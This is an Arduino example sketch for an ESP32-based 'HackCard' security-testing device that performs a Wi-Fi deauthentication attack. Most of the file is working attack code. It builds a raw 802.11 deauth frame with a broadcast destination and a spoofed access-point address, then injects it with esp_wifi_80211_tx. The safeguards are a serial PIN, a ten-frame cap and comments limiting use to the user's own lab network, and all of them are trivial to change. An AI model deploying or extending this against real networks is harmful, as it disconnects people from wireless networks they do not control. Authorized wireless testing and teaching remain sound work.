/*
 * HackCard release 1.0.0 example
 * -------------------------------------------------------------------------
 * FEATURE: Deauth demo (capped)
 * FULL FIRMWARE: /wifi Monitor -> Deauth
 *
 * WHAT IT DOES:
 * Sends a short capped deauth burst toward YOUR lab AP MAC only.
 *
 * BEFORE UPLOAD (Arduino IDE -> Tools):
 *   Board ................ ESP32S3 Dev Module
 *   USB CDC On Boot ...... Enabled
 *
 * HOW TO RUN:
 *   1. File -> Examples -> HackCard -> (this sketch's folder)
 *   2. Edit constants marked EDIT ME at top of file.
 *   3. Upload and open Serial Monitor @ 115200 baud
 *   4. Edit BSSID/channel; type PIN; own network only.
 *
 * LIBRARIES: HackCard, WiFi, esp_wifi
 * INDEX: library/HackCard/EXAMPLES.md | docs/CUSTOM_DEVELOPMENT.md
 * ETHICS: Authorized testing only - networks/tags/PCs you own or have permission to test.
 */

#include <HackCard.h>
#include <WiFi.h>
#include <esp_wifi.h>

static const char* kLabPin = "1234";
static const char* kBssid = "AA:BB:CC:DD:EE:FF";  // EDIT ME — your lab AP MAC
static const uint8_t kMaxFrames = 10;
static const uint8_t kChannel = 6;                // EDIT ME

bool parseMac(const char* text, uint8_t mac[6]) {
  unsigned int a[6];
  if (sscanf(text, "%02x:%02x:%02x:%02x:%02x:%02x",
             &a[0], &a[1], &a[2], &a[3], &a[4], &a[5]) != 6) {
    return false;
  }
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)a[i];
  return true;
}

// setup() - board init, Serial, peripherals
void setup() {
  Serial.begin(115200);
  delay(800);
  Serial.println("HackCard — Deauth Demo (web: /wifi monitor deauth)");
  Serial.println("LIMITED lab demo. Own AP only.");
  RgbRing.begin(45);
  WifiLed.begin(70);
  Buzzer.begin(true);

  uint8_t bssid[6];
  if (!parseMac(kBssid, bssid)) {
    Serial.println("ERROR: edit kBssid to your lab AP MAC (AA:BB:CC:DD:EE:FF)");
    RgbRing.setPattern(RingPattern::Error);
    return;
  }

  Serial.printf("Target BSSID %s ch=%u max_frames=%u\n", kBssid, kChannel, kMaxFrames);
  Serial.printf("Type PIN (%s) to send limited burst...\n", kLabPin);

  if (!Serial.available()) {
    // wait in loop
  }
}

// loop() - keep calling Hal*.update() here
void loop() {
  static bool fired = false;
  static bool configured = false;
  RgbRing.update();
  WifiLed.update();
  if (fired) return;

  uint8_t bssid[6];
  if (!configured) {
    if (!parseMac(kBssid, bssid)) return;
    configured = true;
  }

  if (!Serial.available()) return;
  String pin = Serial.readStringUntil('\n');
  pin.trim();
  if (pin != kLabPin) {
    Serial.println("PIN rejected.");
    Buzzer.playError();
    return;
  }

  parseMac(kBssid, bssid);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("HackCard-DeauthLab", "hackcard2026", kChannel);
  delay(200);

  // Management deauth frame (broadcast RA)
  uint8_t frame[26] = {
    0xc0, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // destination
    0, 0, 0, 0, 0, 0,                    // source (BSSID)
    0, 0, 0, 0, 0, 0,                    // BSSID
    0x00, 0x00,
    0x07, 0x00                           // reason
  };
  memcpy(frame + 10, bssid, 6);
  memcpy(frame + 16, bssid, 6);

  Serial.println("Sending limited deauth burst...");
  RgbRing.setPattern(RingPattern::Error);
  WifiLed.setState(WifiLedState::Error);
  for (uint8_t i = 0; i < kMaxFrames; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    delay(20);
  }
  Serial.printf("Done (%u frames). Session end.\n", kMaxFrames);
  Buzzer.playTune(BuzzerTuneId::Warning);
  RgbRing.setPattern(RingPattern::Success);
  fired = true;
}
